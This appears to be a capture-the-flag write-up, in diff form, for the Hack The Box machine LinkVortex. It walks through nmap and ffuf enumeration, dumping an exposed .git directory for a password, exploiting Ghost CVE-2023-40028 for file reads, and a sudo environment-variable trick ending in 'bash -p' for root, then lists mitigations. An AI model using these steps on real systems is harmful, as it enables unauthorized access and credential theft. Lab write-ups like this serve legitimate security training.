@@ -1,0 +1,225 @@
+# LinkVortex
+
+<span>LinkVortex is an easy-difficulty Linux machine with various ways to leverage symbolic link files (symlinks). The initial foothold involves discovering an exposed </span><span> directory that can be dumped to retrieve credentials. These credentials allow access to the Ghost content management system vulnerable to </span>[CVE-2023-40028](https://nvd.nist.gov/vuln/detail/CVE-2023-40028). This vulnerability allows authenticated users to upload symlinks, enabling arbitrary file read within the Ghost container. The exposed credentials in the Ghost configuration file can then be leveraged to gain a shell as the user on the host system. Finally, the user can execute a script with sudo permissions that are vulnerable to a symlink race condition attack (TOCTOU). This presents an opportunity to escalate privileges by creating links to sensitive files on the system and ultimately gaining root access.
+
+# LinkVortex - Ashbo3n
+
+## Information
+
+**Machine Name**: LinkVortex
+
+**Rating**: 4.3
+
+**Area Of Interest**: <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Arbitrary File Read, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Clear Text Credentials, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Race Condition.</span>
+
+<span class="chip__text htb-body-md htb-text-primary htb-font-medium">**Techniques Used**: </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Fuzzing, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">Password Reuse, </span><span class="chip__text htb-body-md htb-text-primary htb-font-medium">SUDO Exploitation</span>
+
+## <span class="chip__text htb-body-md htb-text-primary htb-font-medium">Initial Shell - Arbitrary File Read</span>
+
+<span class="chip__text htb-body-md htb-text-primary htb-font-medium">As always start with **NMAP**:</span>
+
+```bash
+# Nmap 7.95 scan initiated Sat Jan  3 14:57:23 2026 as: /usr/lib/nmap/nmap -p- -sVC -vv --min-rate=5000 -oN nmap 10.129.231.194
+Nmap scan report for 10.129.231.194
+Host is up, received reset ttl 63 (0.24s latency).
+Scanned at 2026-01-03 14:57:23 EST for 29s
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMHm4UQPajtDjitK8Adg02NRYua67JghmS5m3E+yMq2gwZZJQ/3sIDezw2DVl9trh0gUedrzkqAAG1IMi17G/HA=
+|   256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKKLjX3ghPjmmBL2iV1RCQV9QELEU+NF06nbXTqqj4dz
+80/tcp open  http    syn-ack ttl 63 Apache httpd
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache
+|_http-title: Did not follow redirect to http://linkvortex.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat Jan  3 14:57:52 2026 -- 1 IP address (1 host up) scanned in 29.73 seconds
+
+```
+
+Port 22 is currently useless, Moving on to port 80, It redirects us to [`http://linkvortex.htb/`](http://linkvortex.htb/) Put the domain into /etc/hosts file and then open the website:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/OJHimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/OJHimage.png)
+
+**I will Ignore** the website for now. and do fuzzing and enumeration via ffuf:
+
+ffuf command: `ffuf -c -u http://linkvortex.htb/FUZZ -w ~/wordlist/common.txt -t 60 -ic -fs 0` -c for colored output, and -t for threads and -ic to ignore comments and lastly fs to ignore false positives it was giving me:
+
+```bash
+┌──(root㉿kali)-[~/HTB/LinkVortex]
+└─# ffuf -c -u http://linkvortex.htb/FUZZ -w ~/wordlist/common.txt -t 60 -ic -fs 0
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://linkvortex.htb/FUZZ
+ :: Wordlist         : FUZZ: /root/wordlist/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 60
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 0
+________________________________________________
+
+LICENSE                 [Status: 200, Size: 1065, Words: 149, Lines: 23, Duration: 250ms]
+assets                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 242ms]
+favicon.ico             [Status: 200, Size: 15406, Words: 43, Lines: 2, Duration: 245ms]
+robots.txt              [Status: 200, Size: 121, Words: 7, Lines: 7, Duration: 244ms]
+server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 237ms]
+sitemap.xml             [Status: 200, Size: 527, Words: 6, Lines: 1, Duration: 242ms]
+:: Progress: [4746/4746] :: Job [1/1] :: 161 req/sec :: Duration: [0:00:20] :: Errors: 0 ::
+```
+
+Nothing useful. At first i thought sitemap.xml would be something but nah, and robots.txt isn't that useful either. assets was a false positive. After realizing nothing is useful here i went to website again to see what versions is running via whatweb and all but nothing useful there, then i focused on subdomain fuzzing via: `ffuf -c -u http://linkvortex.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.linkvortex.htb" -t 60 -fs 230` This returned a subdomain named:
+
+```bash
+[0] [0] Openvpn  [1] zsh [2] zsh* [3] zsh                                                                      You are only 1 step away                                                                     Target: 10.129.231.194 | 15:25 
+┌──(root㉿kali)-[~/HTB/LinkVortex]
+└─# ffuf -c -u http://linkvortex.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.linkvortex.htb" -t 60 -fs 230
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://linkvortex.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
+ :: Header           : Host: FUZZ.linkvortex.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 60
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 230
+________________________________________________
+
+dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 241ms]
+[WARN] Caught keyboard interrupt (Ctrl-C)
+
+```
+
+add `dev.linkvortex.htb` to /etc/hosts, now fuzz directories for dev subdomain:
+
+```bash
+┌──(root㉿kali)-[~/HTB/LinkVortex]
+└─# ffuf -c -u http://dev.linkvortex.htb/FUZZ -w ~/wordlist/common.txt -t 60 -ic -fs 0
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://dev.linkvortex.htb/FUZZ
+ :: Wordlist         : FUZZ: /root/wordlist/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 60
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 0
+________________________________________________
+
+.hta                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 245ms]
+.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 245ms]
+.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 246ms]
+.git                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 249ms]
+.git/config             [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 251ms]
+.git/logs/              [Status: 200, Size: 868, Words: 59, Lines: 16, Duration: 251ms]
+.git/HEAD               [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 252ms]
+.git/index              [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 257ms]
+cgi-bin/                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 243ms]
+index.html              [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 238ms]
+server-status           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 239ms]
+:: Progress: [4746/4746] :: Job [1/1] :: 250 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
+
+```
+
+Found exposed git. Download it to our attacker machine via git-dumper and then found some deleted files and password inside them:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/By7image.png)](http://localhost:4444/uploads/images/gallery/2026-01/By7image.png)
+
+We have the password but not the username so let's move on to the website to get username, going to this URL will get us at signin page: `<a href="http://linkvortex.htb/ghost/#/signin">http://linkvortex.htb/ghost/#/signin</a>`
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/Q6Uimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/Q6Uimage.png)
+
+It requires a email and a password. Let's try to put anything in email and password like i tried to put <ashborn@ashborn.com> and it will tell us user not found:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/y37image.png)](http://localhost:4444/uploads/images/gallery/2026-01/y37image.png)
+
+but when you enter <admin@linkvortex.htb> it doesn't return user not found meaning it is a valid username!
+
+moving on to git dir again i found the version of the cms running:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/nNmimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/nNmimage.png)
+
+with creds + versions + password found we can try to search online to see if a payload exists.
+
+Now after searching online i found this github repo for a file read payload: [https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028)
+
+After downloading it and running it we can read the files:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/mNBimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/mNBimage.png)
+
+Search online for ghost cms configuration file's, after searching for it and many hit and trial's i was able to get the user and password to ssh into the system: the configuration file we have to view with the exploit is: /var/lib/ghost/config.production.json and you will see user and pass:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/d71image.png)](http://localhost:4444/uploads/images/gallery/2026-01/d71image.png)
+
+Logged in ssh and found the user flag:
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/mHUimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/mHUimage.png)
+
+## Root - Sudo Misconfiguration
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/9FLimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/9FLimage.png)
+
+sudo -l shows we can run sudo /usr/bin/bash /opt/ghost/clean\_symlink.sh \*.png as root so
+
+1. **Point to a "neutral" file:** Any file that doesn't have "etc" or "root" in its path will work. `/bin/ls` or `/vmlinuz` are good candidates. command: `ln -sf /bin/ls test.png`
+2. Execute the sudo command: `sudo CHECK_CONTENT=<span class="hljs-string">"/tmp/pwn.sh"</span> /usr/bin/bash /opt/ghost/clean_symlink.sh test.png`
+3. Enter Root: bash -p
+
+[![image.png](http://localhost:4444/uploads/images/gallery/2026-01/scaled-1680-/9whimage.png)](http://localhost:4444/uploads/images/gallery/2026-01/9whimage.png)
+
+Box Pwned successfully!!!
+
+## Mitigations
+
+1. Restrict Access to the `.git` Directory:
+
+Exposure of the `.git` directory allows an attacker to reconstruct the entire source code, view commit history, and potentially extract hardcoded credentials or API keys, Configure the web server (Nginx or Apache) to explicitly deny access to all hidden files and directories starting with a dot.
+
+ 2. Update Ghost CMS and Dependencies
+
+Running an outdated CMS version leaves the application susceptible to known CVEs and exploit chains, Implement a regular patch management lifecycle. Update Ghost to the latest stable version using the Ghost-CLI (`ghost update`).
+
+ 3. Implement Strict Sudo Path and Argument Constraints
+
+The current `sudo` configuration allows a wildcard (`*.png`) and preserves the `CHECK_CONTENT` environment variable, which led to the privilege escalation, Refine the `/etc/sudoers` entry to remove the wildcard and disable environment variable preservation for this specific command, Change the sudoers entry to: `bob ALL=(ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh` Ensure `env_keep` does not include variables that can influence script logic.
